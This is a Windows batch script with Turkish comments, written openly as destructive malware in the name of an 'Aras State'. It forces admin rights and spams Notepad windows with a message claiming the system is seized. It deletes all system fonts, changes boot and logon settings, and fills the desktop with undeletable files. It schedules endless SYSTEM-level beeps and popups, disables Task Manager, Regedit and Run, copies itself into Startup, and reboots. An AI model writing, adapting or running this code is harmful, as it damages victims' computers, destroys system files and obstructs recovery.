@echo off
:: Yönetici yetkisi zorunlu
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell "Start-Process '%~f0' -Verb RunAs"
    exit
)

:: === 1. Script çalışır çalışmaz Notepad açılsın ve içinde mesaj yazılsın ===
:: (Birden fazla Notepad penceresi açılacak, kapatılması zor olsun)
echo BİLGİSAYARIN ARAS DEVLETİ TARAFINDAN YOK EDİLDİ> "%TEMP%\ArasYokEdildi.txt"
echo.>> "%TEMP%\ArasYokEdildi.txt"
echo KURTARMAYA ÇALIŞMA>> "%TEMP%\ArasYokEdildi.txt"
echo BU SİSTEM ARTIK TAMAMEN BİZİMDİR>> "%TEMP%\ArasYokEdildi.txt"
echo TÜM VERİLERİNİZ ELE GEÇİRİLDİ>> "%TEMP%\ArasYokEdildi.txt"
echo YÜCE LİDER ARAS PAŞA'NIN EMRİYLE>> "%TEMP%\ArasYokEdildi.txt"
echo SİSTEM KİLİTLENDİ VE YOK EDİLDİ>> "%TEMP%\ArasYokEdildi.txt"
echo HER ŞEY KIPKIRMIZI KAOSA DÖNDÜ>> "%TEMP%\ArasYokEdildi.txt"
echo DİRENMEK FAYDASIZDIR>> "%TEMP%\ArasYokEdildi.txt"
echo ARAS DEVLETİ SONSUZA KADAR YAŞAYACAK>> "%TEMP%\ArasYokEdildi.txt"

:: 10 tane Notepad aç (kaos için)
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"
start notepad "%TEMP%\ArasYokEdildi.txt"

:: Dosyayı silinemez yap
icacls "%TEMP%\ArasYokEdildi.txt" /deny Everyone:(F) /inheritance:r >nul

:: === 2. Oturum açma ekranından önce mesaj + oturum açmayı engelle ===
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "ARAS DEVLETİ" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "Bu sistem Aras Devleti tarafından yok edildi.%0D%0A%0D%0AOturum açmanıza izin verilmiyor.%0D%0AKurtarmaya çalışmak faydasızdır.%0D%0ATüm verileriniz ele geçirildi.%0D%0AYüce Lider Aras Paşa'nın emriyle sistem kilitlenmiştir.%0D%0ADİRENMEK FAYDASIZDIR." /f

:: Oturum açmayı zorlaştır/kilitle
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastUserName /t REG_DWORD /d 1 /f

:: === 3. Daha fazla kaos ekle ===
:: Açılış siyah ekran (logo yok)
bcdedit /set {default} quietboot yes >nul
bcdedit /set {default} bootuxdisabled on >nul
bcdedit /set {bootmgr} custom:250000c2 "ARAS DEVLETİ - SİSTEM YOK EDİLDİ" >nul

:: Fontları sil
del /f /q "C:\Windows\Fonts\*.ttf" >nul 2>&1
del /f /q "C:\Windows\Fonts\*.otf" >nul 2>&1

:: Her yer kıpkırmızı
reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Software\Microsoft\Windows\DWM" /v AccentColor /t REG_DWORD /d 0x000000FF /f

:: Masaüstünü 250 silinemez dosya ile doldur
powershell -Command "1..250 | %% { echo 'ARAS DEVLETİ YOK ETTİ' > \"$env:USERPROFILE\Desktop\YOK_$_ .txt\"; icacls \"$env:USERPROFILE\Desktop\YOK_$_ .txt\" /deny Everyone:(F) /inheritance:r }"

:: Sürekli beep sesi
schtasks /create /tn "ArasYokSes" /tr "powershell -Command \"while($true){[console]::beep(1800,400); [console]::beep(600,600); Start-Sleep -Milliseconds 700}\" " /sc onstart /ru SYSTEM /f >nul

:: Popup bombardımanı
schtasks /create /tn "ArasYokPopup" /tr "msg * SİSTEM ARAS DEVLETİ TARAFINDAN YOK EDİLDİ" /sc minute /mo 1 /ru SYSTEM /f >nul

:: Task Manager, Regedit, Çalıştır kapat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f

:: Kendini kalıcı yap
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ArasYokEt.bat" >nul

echo.
echo ARAS DEVLETİ YOK ETME OPERASYONU BAŞARILI.
echo - Script çalışır çalışmaz 10 tane Notepad açılacak ve mesajı gösterecek.
echo - Girişten önce uzun uyarı → oturum açmak zor/imkansız.
echo - Fontlar silindi, masaüstü dolu, ses deli eder, popup'lar, kıpkırmızı tema.
echo Sistem yeniden başlatılıyor...
pause
shutdown /r /t 15
